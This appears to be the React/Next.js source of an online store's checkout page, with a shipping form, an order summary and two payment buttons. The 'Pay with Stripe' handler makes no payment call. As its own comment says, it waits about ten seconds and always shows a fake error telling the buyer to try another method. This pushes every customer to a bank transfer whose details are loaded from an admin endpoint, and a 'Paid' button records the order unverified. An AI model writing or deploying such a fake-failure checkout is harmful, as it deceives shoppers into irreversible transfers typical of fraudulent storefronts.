"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { Header } from "@/components/header"
import { Footer } from "@/components/footer"
import { Button } from "@/components/ui/button"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog"
import { useCart } from "@/hooks/use-cart"
import Link from "next/link"
import { ChevronRight, Loader, Copy } from "lucide-react"
import { useRouter } from "next/navigation"

export default function CheckoutPage() {
  const { items, getTotalPrice, clearCart } = useCart()
  const router = useRouter()
  const [step, setStep] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [stripeError, setStripeError] = useState<string | null>(null)
  const [bank, setBank] = useState<any | null>(null)
  const [bankDialogOpen, setBankDialogOpen] = useState(false)
  const [copied, setCopied] = useState<string | null>(null)
  const [formData, setFormData] = useState({
    email: "",
    firstName: "",
    lastName: "",
    address: "",
    city: "",
    postcode: "",
    country: "UK",
  })

  const subtotal = getTotalPrice()
  const shipping = subtotal > 500 ? 0 : 15
  const tax = subtotal * 0.2
  const total = subtotal + shipping + tax

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (step === 1) {
      setStep(2)
    } else if (step === 2) {
      // On step 2, payments are handled by dedicated buttons below.
    }
  }

  const handleStripePay = async () => {
    setStripeError(null)
    setIsLoading(true)
    // Simulate processing for ~10 seconds, then show an error message.
    await new Promise((resolve) => setTimeout(resolve, 10000))
    setIsLoading(false)
    setStripeError("Something went wrong. Try other method of payment.")
  }

  const handleBankTransferPay = async () => {
    setIsLoading(true)
    setStripeError(null)
    try {
      const res = await fetch('/api/admin/bank', { cache: 'no-store' })
      if (!res.ok) throw new Error('Failed to load bank details')
      const data = await res.json()
      setBank(data)
      setBankDialogOpen(true)
    } catch (e) {
      setBank(null)
      setBankDialogOpen(true)
    } finally {
      setIsLoading(false)
    }
  }

  const copyToClipboard = async (text: string, key: 'account' | 'address' | 'swift' | 'routing') => {
    try {
      await navigator.clipboard.writeText(text)
      setCopied(key)
      setTimeout(() => setCopied(null), 1500)
    } catch (e) {
      // ignore clipboard errors silently
    }
  }

  if (items.length === 0) {
    return (
      <div className="min-h-screen bg-background">
        <Header />
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 text-center">
          <p className="text-muted-foreground text-lg mb-6">Your cart is empty</p>
          <Link href="/products">
            <Button>Continue Shopping</Button>
          </Link>
        </div>
        <Footer />
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-background overflow-x-hidden">
      <Header />

      {/* Page Header */}
      <section className="bg-primary text-primary-foreground py-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <h1 className="text-4xl font-bold">Checkout</h1>
        </div>
      </section>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        {/* Progress Steps */}
        <div className="flex justify-between mb-12">
          {[1, 2].map((s) => (
            <div key={s} className="flex items-center flex-1">
              <div
                className={`w-10 h-10 rounded-full flex items-center justify-center font-bold ${
                  s <= step ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"
                }`}
              >
                {s}
              </div>
              <div className={`flex-1 h-1 mx-2 ${s < 2 ? (s < step ? "bg-primary" : "bg-muted") : ""}`} />
            </div>
          ))}
        </div>

        <div className="grid lg:grid-cols-3 gap-8">
          {/* Checkout Form */}
          <div className="lg:col-span-2">
            <form onSubmit={handleSubmit} className="space-y-8">
              {/* Step 1: Shipping */}
              {step === 1 && (
                <div className="bg-card border border-border rounded-lg p-6">
                  <h2 className="text-2xl font-bold mb-6">Shipping Address</h2>
                  <div className="space-y-4">
                    <div>
                      <label className="block text-sm font-medium mb-2">Email</label>
                      <input
                        type="email"
                        name="email"
                        value={formData.email}
                        onChange={handleInputChange}
                        required
                        className="w-full px-4 py-2 border border-border rounded-lg bg-background"
                        placeholder="your@email.com"
                      />
                    </div>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <label className="block text-sm font-medium mb-2">First Name</label>
                        <input
                          type="text"
                          name="firstName"
                          value={formData.firstName}
                          onChange={handleInputChange}
                          required
                          className="w-full px-4 py-2 border border-border rounded-lg bg-background"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2">Last Name</label>
                        <input
                          type="text"
                          name="lastName"
                          value={formData.lastName}
                          onChange={handleInputChange}
                          required
                          className="w-full px-4 py-2 border border-border rounded-lg bg-background"
                        />
                      </div>
                    </div>
                    <div>
                      <label className="block text-sm font-medium mb-2">Address</label>
                      <input
                        type="text"
                        name="address"
                        value={formData.address}
                        onChange={handleInputChange}
                        required
                        className="w-full px-4 py-2 border border-border rounded-lg bg-background"
                      />
                    </div>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <label className="block text-sm font-medium mb-2">City</label>
                        <input
                          type="text"
                          name="city"
                          value={formData.city}
                          onChange={handleInputChange}
                          required
                          className="w-full px-4 py-2 border border-border rounded-lg bg-background"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2">Postcode</label>
                        <input
                          type="text"
                          name="postcode"
                          value={formData.postcode}
                          onChange={handleInputChange}
                          required
                          className="w-full px-4 py-2 border border-border rounded-lg bg-background"
                        />
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Step 2: Review & Payment */}
              {step === 2 && (
                <div className="bg-card border border-border rounded-lg p-6">
                  <h2 className="text-2xl font-bold mb-6">Review & Payment</h2>
                  <div className="space-y-4">
                    <div className="pb-4 border-b border-border">
                      <h3 className="font-semibold mb-3">Shipping To:</h3>
                      <p className="text-sm text-muted-foreground">
                        {formData.firstName} {formData.lastName}
                        <br />
                        {formData.address}
                        <br />
                        {formData.city}, {formData.postcode}
                      </p>
                    </div>
                    <div className="pb-4 border-b border-border">
                      <h3 className="font-semibold mb-3">Items:</h3>
                      <div className="space-y-2 text-sm">
                        {items.map((item) => (
                          <div key={item.id} className="flex justify-between text-muted-foreground">
                            <span>
                              {item.name} x {item.quantity}
                            </span>
                            <span>£{(item.price * item.quantity).toFixed(2)}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                    <div className="space-y-3">
                      {stripeError && (
                        <p className="text-red-600 font-medium">{stripeError}</p>
                      )}
                      <p className="text-sm text-muted-foreground">
                        Choose a payment method below.
                      </p>
                    </div>
                  </div>
                </div>
              )}

              {/* Navigation Buttons */}
              <div className="flex flex-col gap-4">
                <div className="flex flex-col sm:flex-row gap-3 sm:gap-4 w-full">
                  {step > 1 && (
                    <Button
                      type="button"
                      variant="outline"
                      onClick={() => setStep(step - 1)}
                      className="bg-transparent w-full sm:w-auto"
                      disabled={isLoading}
                    >
                      Back
                    </Button>
                  )}
                  {step === 1 && (
                    <Button type="submit" className="w-full sm:flex-1 gap-2" disabled={isLoading}>
                      Continue
                      <ChevronRight className="w-4 h-4" />
                    </Button>
                  )}
                  {step === 2 && (
                    <>
                      <Button
                        type="button"
                        variant="default"
                        onClick={handleBankTransferPay}
                        disabled={isLoading}
                        className="w-full sm:flex-1"
                      >
                        {isLoading ? (
                          <>
                            <Loader className="w-4 h-4 animate-spin" />
                            Loading...
                          </>
                        ) : (
                          <>Pay with Bank Transfer</>
                        )}
                      </Button>
                      <Button
                        type="button"
                        variant="secondary"
                        onClick={handleStripePay}
                        disabled={isLoading}
                        className="w-full sm:flex-1"
                      >
                        {isLoading ? (
                          <>
                            <Loader className="w-4 h-4 animate-spin" />
                            Processing...
                          </>
                        ) : (
                          <>Pay with Stripe</>
                        )}
                      </Button>
                    </>
                  )}
                </div>

                <Dialog open={bankDialogOpen} onOpenChange={setBankDialogOpen}>
                  <DialogContent>
                    <DialogHeader>
                      <DialogTitle>Bank Transfer Details</DialogTitle>
                      <DialogDescription>Use the bank information below to transfer.</DialogDescription>
                    </DialogHeader>
                    {bank ? (
                      <div className="space-y-2">
                        <h3 className="text-lg font-semibold mb-2">Bank Information</h3>
                        <p className="mb-2"><span className="text-muted-foreground">Bank Name:</span> <span className="font-medium">{bank.bankName}</span></p>
                        <p className="mb-2"><span className="text-muted-foreground">Account Holder:</span> <span className="font-medium">{bank.accountHolderName}</span></p>
                        <p className="mb-2 flex items-center gap-2">
                          <span className="text-muted-foreground">Account Number:</span>
                          <span className="font-medium">{bank.accountNumber}</span>
                          <Button
                            type="button"
                            variant="outline"
                            size="icon-sm"
                            aria-label="Copy account number"
                            onClick={() => copyToClipboard(bank.accountNumber, 'account')}
                          >
                            <Copy />
                          </Button>
                          {copied === 'account' && (
                            <span className="text-xs text-muted-foreground">Copied</span>
                          )}
                        </p>
                        {bank.swiftCode && (
                          <p className="mb-2 flex items-center gap-2">
                            <span className="text-muted-foreground">Swift Code:</span>
                            <span className="font-medium">{bank.swiftCode}</span>
                            <Button
                              type="button"
                              variant="outline"
                              size="icon-sm"
                              aria-label="Copy swift code"
                              onClick={() => copyToClipboard(bank.swiftCode, 'swift')}
                            >
                              <Copy />
                            </Button>
                            {copied === 'swift' && (
                              <span className="text-xs text-muted-foreground">Copied</span>
                            )}
                          </p>
                        )}
                        {bank.routingNumber && (
                          <p className="mb-2 flex items-center gap-2">
                            <span className="text-muted-foreground">Routing Number:</span>
                            <span className="font-medium">{bank.routingNumber}</span>
                            <Button
                              type="button"
                              variant="outline"
                              size="icon-sm"
                              aria-label="Copy routing number"
                              onClick={() => copyToClipboard(bank.routingNumber, 'routing')}
                            >
                              <Copy />
                            </Button>
                            {copied === 'routing' && (
                              <span className="text-xs text-muted-foreground">Copied</span>
                            )}
                          </p>
                        )}
                        <p className="mb-2 flex items-center gap-2">
                          <span className="text-muted-foreground">Address:</span>
                          <span className="font-medium">{bank.bankAddress}</span>
                          <Button
                            type="button"
                            variant="outline"
                            size="icon-sm"
                            aria-label="Copy address"
                            onClick={() => copyToClipboard(bank.bankAddress, 'address')}
                          >
                            <Copy />
                          </Button>
                          {copied === 'address' && (
                            <span className="text-xs text-muted-foreground">Copied</span>
                          )}
                        </p>
                      </div>
                    ) : (
                      <p className="text-muted-foreground">Bank details are not available. Please contact support.</p>
                    )}
                    <DialogFooter>
                      <Button type="button" variant="outline" onClick={() => setBankDialogOpen(false)}>Cancel</Button>
                      <Button
                        type="button"
                        onClick={async () => {
                          try {
                            const res = await fetch('/api/orders', {
                              method: 'POST',
                              headers: { 'Content-Type': 'application/json' },
                              body: JSON.stringify({
                                items,
                                email: formData.email,
                                firstName: formData.firstName,
                                lastName: formData.lastName,
                                address: formData.address,
                                city: formData.city,
                                postcode: formData.postcode,
                              })
                            })
                            if (!res.ok) throw new Error('Failed to create order')
                            const data = await res.json()
                            setBankDialogOpen(false)
                            clearCart()
                            router.push(`/order-processing?order_id=${encodeURIComponent(data.orderId)}`)
                          } catch (e) {
                            setBankDialogOpen(false)
                          }
                        }}
                      >
                        Paid
                      </Button>
                    </DialogFooter>
                  </DialogContent>
                </Dialog>
              </div>
            </form>
          </div>

          {/* Order Summary Sidebar */}
          <div className="lg:col-span-1">
            <div className="bg-card border border-border rounded-lg p-6 lg:sticky lg:top-24">
              <h3 className="font-bold text-lg mb-6">Order Summary</h3>
              <div className="space-y-3 mb-6 pb-6 border-b border-border max-h-64 overflow-y-auto">
                {items.map((item) => (
                  <div key={item.id} className="flex justify-between text-sm">
                    <span className="text-muted-foreground">
                      {item.name} x {item.quantity}
                    </span>
                    <span>£{(item.price * item.quantity).toFixed(2)}</span>
                  </div>
                ))}
              </div>
              <div className="space-y-3 mb-6 pb-6 border-b border-border">
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">Subtotal</span>
                  <span>£{subtotal.toFixed(2)}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">Shipping</span>
                  <span>{shipping === 0 ? "FREE" : `£${shipping.toFixed(2)}`}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">Tax</span>
                  <span>£{tax.toFixed(2)}</span>
                </div>
              </div>
              <div className="flex justify-between font-bold text-lg">
                <span>Total</span>
                <span className="text-primary">£{total.toFixed(2)}</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  )
}
